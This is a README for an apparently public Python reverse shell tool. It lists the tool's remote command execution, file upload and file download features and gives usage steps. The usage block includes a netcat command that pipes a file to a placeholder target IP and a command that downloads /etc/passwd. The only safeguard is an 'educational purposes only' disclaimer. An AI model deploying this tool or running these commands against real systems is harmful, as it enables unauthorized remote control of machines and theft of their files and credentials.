# Reverse Shell Tool

This repository contains reverse shell tool written in Python. This tool is for educational purposes only and should be used in a controlled, authorized environment.

## Features

- Execute commands on the target machine.
- Change directory on the target machine.
- Upload files from the attacker's machine to the target machine.
- Download files from the target machine to the attacker's machine.

## Prerequisites

- Python installed on both the attacker's and target's machines.
- Network access between the attacker's and target's machines.
- Necessary ports open and not blocked by firewalls.

## Usage
git clone https://github.com/Guruh-dev/Reverse-Shell.git

cd Reverse-Shell

### Set Up the Listener

On the attacker's machine, set up a listener to receive the reverse shell connection. You can use `netcat` (nc) for this purpose.

```sh
python3 reverse_shell.py
python3 reverse_shell.py -h
python3 reverse_shell.py <TARGET_IP> <TARGET_PORT>
whoami
cd /etc
upload test.txt
cat test.txt | nc -w 3 YOUR_TARGET_IP YOUR_PORT
download /etc/passwd
